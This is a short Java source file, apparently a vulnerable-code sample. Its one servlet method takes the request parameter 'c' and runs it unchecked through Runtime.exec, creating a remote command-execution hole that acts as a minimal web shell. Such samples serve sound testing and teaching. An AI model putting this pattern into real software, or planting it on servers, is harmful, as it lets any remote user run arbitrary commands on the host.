import javax.servlet.http.HttpServletRequest;

public class R {
  public void go(HttpServletRequest request) {
    String cmd = request.getParameter("c");
    Runtime.getRuntime().exec(cmd);
  }
}
